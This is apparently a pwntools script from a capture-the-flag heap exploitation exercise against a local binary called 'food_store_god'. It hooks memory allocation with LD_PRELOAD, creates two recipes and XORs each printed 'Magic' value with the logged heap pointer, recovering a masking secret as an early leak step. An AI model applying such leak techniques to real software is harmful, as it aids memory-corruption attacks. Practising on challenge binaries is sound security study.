import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
env={'LD_LIBRARY_PATH':DIR,'LD_PRELOAD':DIR+'/hook.so'}
logf=open(DIR+'/h2.log','w')
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env=env,stderr=logf)
def ru(x): return p.recvuntil(x)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'AAAA')
def add(title):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1')
    ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(title)
    ru(b'Choose ingredient :'); sl(b'0')
    ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'2')
    ru(b'Your choice: '); sl(b'4')
    return m
mA=add(b'AAAA'); mB=add(b'BBBB')
logf.flush()
print('magicA',mA); print('magicB',mB)
# parse hook log for 0x88 reallocs (recipes). last two before/around are our recipes
import re
allocs=[]
for line in open(DIR+'/h2.log'):
    m=re.search(r'realloc\(0x0+,0x0*88\) = (0x[0-9a-f]+)',line)
    if m: allocs.append(int(m.group(1),16))
print('recipe 0x88 allocs:', [hex(a) for a in allocs])
# magic bytes: hex string, byte i = magic[2i:2i+2]; value bytes = that; ptr = alloc; secret = ptr_bytes ^ magic_bytes
def secret_from(magic_hex, ptr):
    mb=bytes.fromhex(magic_hex.decode())
    pb=ptr.to_bytes(8,'little')
    return bytes(a^b for a,b in zip(mb,pb))
# our recipes are the last two 0x88 allocs
pA,pB=allocs[-2],allocs[-1]
sA=secret_from(mA,pA); sB=secret_from(mB,pB)
print('secret from A:', sA.hex())
print('secret from B:', sB.hex())
print('match:', sA==sB)
print('B-A =', hex(pB-pA))
sl(b'7')
